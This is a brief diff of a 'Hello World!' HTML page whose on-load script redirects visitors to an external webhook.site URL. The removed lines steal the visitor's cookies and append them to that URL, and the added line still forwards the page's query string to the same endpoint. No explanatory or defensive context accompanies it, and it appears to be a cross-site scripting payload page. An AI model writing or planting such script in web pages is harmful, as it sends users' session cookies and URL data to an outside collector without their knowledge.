@@ -2,10 +2,8 @@
   Hello World!
   <script>
     function runStuff() {
-      const cookies = encodeURIComponent(document.cookie);
-      document.location = "https://webhook.site/0fc9bb0e-b170-4b60-93ce-378ec0965957" + "?q=" + cookies;
+      document.location = "https://webhook.site/0fc9bb0e-b170-4b60-93ce-378ec0965957" + window.location.search;
     };
-    
     runStuff();
   </script>
 </body>
